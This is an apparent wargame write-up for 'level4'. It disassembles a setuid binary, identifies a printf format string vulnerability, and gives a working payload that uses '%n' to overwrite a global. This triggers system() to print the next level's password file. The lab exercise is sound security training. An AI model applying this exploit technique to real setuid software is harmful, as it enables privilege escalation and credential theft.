# Level4

## Solution

* There is one file in our home, ```level4```, belonging to ```level5``` user, with suid.
* Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

* The only purpose of the ```main``` function is to call ```n``` function.

* Here is the disassembled ```n``` function:
```asm
0x08048457 <+0>:	push   ebp
0x08048458 <+1>:	mov    ebp,esp
0x0804845a <+3>:	sub    esp,0x218
0x08048460 <+9>:	mov    eax,ds:0x8049804
0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
0x08048471 <+26>:	lea    eax,[ebp-0x208]
0x08048477 <+32>:	mov    DWORD PTR [esp],eax
0x0804847a <+35>:	call   0x8048350 <fgets@plt>
0x0804847f <+40>:	lea    eax,[ebp-0x208]
0x08048485 <+46>:	mov    DWORD PTR [esp],eax
0x08048488 <+49>:	call   0x8048444 <p>
0x0804848d <+54>:	mov    eax,ds:0x8049810
0x08048492 <+59>:	cmp    eax,0x1025544
0x08048497 <+64>:	jne    0x80484a5 <n+78>
0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
0x080484a0 <+73>:	call   0x8048360 <system@plt>
0x080484a5 <+78>:	leave
0x080484a6 <+79>:	ret
   ```

* Several interesting information about it:

	* ```n``` calls ```fgets``` at offset ```35``` function with a buffer allocated on the stack.
	* then it calls ```p``` function (see after) at offset ```49```, passing the buffer in parameter.
	* between offsets ```54``` and ```64```, it compares the value contained at the address ```0x8049810``` with the value ```0x1025544```.
	* if they are the same, it calls ```system``` function. ```gdb``` allows us to see that the command passed in parameter is ```/bin/cat /home/user/level5/.pass```

* Here is the diassembled ```p``` function:
```
0x08048444 <+0>:	push   ebp
0x08048445 <+1>:	mov    ebp,esp
0x08048447 <+3>:	sub    esp,0x18
0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
0x0804844d <+9>:	mov    DWORD PTR [esp],eax
0x08048450 <+12>:	call   0x8048340 <printf@plt>
0x08048455 <+17>:	leave
0x08048456 <+18>:	ret
   ```

* Interesting information about it:

	* there is call to ```printf``` at offset ```12```. ```gdb``` allows us to see that it is with the buffer allocated for ```fgets```


* What we did with all of this:

	* the goal was to modify the value held at ```0x8049810``` so that it becomes equal to ```0x1025544```, what would launch the ```system("/bin/cat /home/user/level5/.pass")```
	* for that we exploited the "format string vulnerability" of ```printf``` called in ```p```, with our own ```input``` (the one we send to ```fgets```).
	* we used conversion specifiers (for instance ```%x```), to get to the beginning of the buffer allocated for ```fgets```. Indeed, each time we use a conversion specifier, ```printf``` "points" after the last argument it processed on the stack.
	* We made sure the first value at the beginning of the buffer was ```0x8049810```
	* then we used ```%n``` to store at this address the length of the output string

	* To make a long story short:
	```sh
	python -c "print('10980408'.decode('hex') + '%8x ' * 10 + '%16930022x' + '%n')" > /var/crash/lvl4
	```
	* ```10980408``` is the little endian written address we want to write at
	* we used ```11``` conversion specifiers to reach the beginning of the buffer (there were ```(10 + 1) * 4 = 44``` bytes separating first argument of printf from the buffer)
	* we use the lenght modifier ```%16930022x``` to output a final string of the size ```0x1025544```
	* ```%n``` stores this value at the address ```0x8049810```

	* We finally get the flag by launching:
	```sh
	cat /var/crash/lvl4 | ./level4
	```
